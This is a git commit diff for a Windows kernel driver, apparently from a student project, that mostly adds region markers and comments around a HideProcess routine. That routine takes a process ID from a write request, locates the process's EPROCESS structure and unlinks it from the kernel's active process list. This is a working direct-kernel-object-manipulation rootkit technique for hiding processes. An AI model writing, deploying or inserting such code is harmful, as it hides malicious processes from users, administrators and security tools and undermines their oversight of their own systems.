8030f1b701360715d35ab0a19be0e59c130091b7
itay ben-shalom <itay ben-shalom>
2016-12-12 14:40:41 +0200

    testing driver...

--- itay/finalProj/node/DKOM/WDM-DKOM/WDM-DKOM/DRIVER.c
+++ itay/finalProj/node/DKOM/WDM-DKOM/WDM-DKOM/DRIVER.c
@@ -8,10 +8,16 @@
 # define RtlStringCbPrintf RtlStringCbPrintfW
 #endif
 
+
+#pragma region constants
 UNICODE_STRING Autograph = RTL_CONSTANT_STRING(L"BASH"); // L because its a pointer to wchar_t
+#pragma endregion
+
+#pragma region global vars
 UNICODE_STRING DeviceName; // = RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver");
 UNICODE_STRING dosDeviceName; // = RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
 PDEVICE_OBJECT ptrDeviceObj;
+#pragma endregion
 
 VOID Unload(PDRIVER_OBJECT pDriverObj)
 {
@@ -25,8 +31,9 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 	UNREFERENCED_PARAMETER(pDeviceObj);
 
 	irp->IoStatus.Information = 0; // if not successful
-	PVOID buffer = MmGetSystemAddressForMdlSafe(irp->MdlAddress, NormalPagePriority); // get non paged memory => this is the data passed with the request (pid)
 
+#pragma region get passed data
+	PVOID buffer = MmGetSystemAddressForMdlSafe(irp->MdlAddress, NormalPagePriority); // get non paged memory => this is the data passed with the request (pid)
 	if(!buffer)
 	{
 		irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
@@ -35,7 +42,9 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 	}
 
 	DbgPrint("Process ID: %d", *(PHANDLE)buffer);
+#pragma endregion
 
+#pragma region try to access process
 	PEPROCESS Process;
 	NTSTATUS status = PsLookupProcessByProcessId(*(PHANDLE)buffer, &Process);
 	if(!NT_SUCCESS(status)) // if fails
@@ -45,10 +54,12 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 		IoCompleteRequest(irp, IO_NO_INCREMENT);
 		return STATUS_INSUFFICIENT_RESOURCES;
 	}
+#pragma endregion
 
 	DbgPrint("EPROCESS address: %#x", Process);
 	PULONG ptr = (PULONG)Process;
 
+#pragma region scan EPROCESS for pid
 	// Scan the EPROCESS structure for the PID
 	ULONG offset = 0;
 	PLIST_ENTRY CurrListEntry; //PrevListEntry, NextListEntry;
@@ -70,12 +81,15 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 		IoCompleteRequest(irp, IO_NO_INCREMENT);
 		return STATUS_UNSUCCESSFUL;
 	}
+#pragma endregion
 
 	CurrListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset); // Get the ActiveProcessLinks address
 
+#pragma region remove EPROCESS object
 	// PrevListEntry = CurrListEntry->Blink;
 	// NextListEntry = CurrListEntry->Flink;
-	// Unlink the target process from other processes (unlink from list)
+	// Unlink the target process from other processes (unlink from list):
+
 	CurrListEntry->Blink->Flink = CurrListEntry->Flink; // point prevEPROCESS Flink to nextEPROCESS
 	CurrListEntry->Flink->Blink = CurrListEntry->Blink; // point nextEPROCESS Blink to prevEPROCESS
 
@@ -83,6 +97,7 @@ NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device o
 	CurrListEntry->Blink = CurrListEntry;
 
 	ObDereferenceObject(Process); // Dereference the target process -> decrease the reference counter
+#pragma endregion
 
 	irp->IoStatus.Information = sizeof(HANDLE); // if successful there is information
 	irp->IoStatus.Status = STATUS_SUCCESS;
@@ -103,7 +118,7 @@ NTSTATUS NotSupportedOperation(PDEVICE_OBJECT pDeviceObj, PIRP irp)
 	if(!NT_SUCCESS(RtlStringCbPrintf(buff, 50 * sizeof(WCHAR), L"Major function: %lu\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction))) // get major function code and cast to string
 		DbgPrint("Could not cast major function to string\n");
 	// sprintf(buff, "Major function: %lu\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction); // get major function code and cast to string
-	DbgPrint(buff); // Dbgprint the above
+	DbgPrint((PCSTR)buff); // Dbgprint the above
 	return NtStatus;
 }
 
@@ -124,11 +139,10 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath)
 	{
 		pDriverObj->MajorFunction[i] = NotSupportedOperation;
 	}
-
 	pDriverObj->MajorFunction[IRP_MJ_WRITE] = HideProcess;
 
 	ptrDeviceObj->Flags &= ~DO_DEVICE_INITIALIZING;
-	ptrDeviceObj->Flags |= DO_DIRECT_IO;
+	ptrDeviceObj->Flags |= DO_DIRECT_IO; // using direct IO
 
 	return STATUS_SUCCESS;
 }
